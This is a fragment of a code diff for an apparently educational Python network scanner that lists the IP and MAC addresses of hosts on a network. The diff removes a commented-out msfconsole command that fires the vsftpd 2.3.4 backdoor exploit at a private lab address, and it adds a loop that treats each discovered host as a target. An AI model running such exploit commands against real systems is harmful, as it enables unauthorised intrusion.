@@ -26,19 +26,9 @@ for sent, received in result:
 # print clients
 print("Available devices in the network:")
 print("IP" + " "*18+"MAC")
+
 for client in clients:
     print("{:16}    {}".format(client['ip'], client['mac']))
 
-
-#define function to launch msfconsole
-
-#In os.system
-
-#msfconsole -q -x " use exploit/unix/ftp/vsftpd_234_backdoor; set rhost 192.168.56.111; run
-
-
-
-
-
-
-    		
+for client in clients:
+    target = client['ip']
